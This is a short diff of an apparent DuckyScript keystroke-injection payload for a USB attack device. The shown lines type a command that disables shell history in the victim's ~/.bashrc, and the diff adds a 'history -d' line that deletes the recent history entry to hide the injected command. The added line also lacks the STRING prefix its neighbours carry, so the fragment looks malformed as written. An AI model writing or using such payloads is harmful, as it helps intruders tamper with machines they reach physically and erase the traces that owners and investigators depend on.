@@ -18,6 +18,7 @@ DELAY 1000
 ENTER
 DELAY 500
 STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
 DELAY 500
 ENTER
 DELAY 500
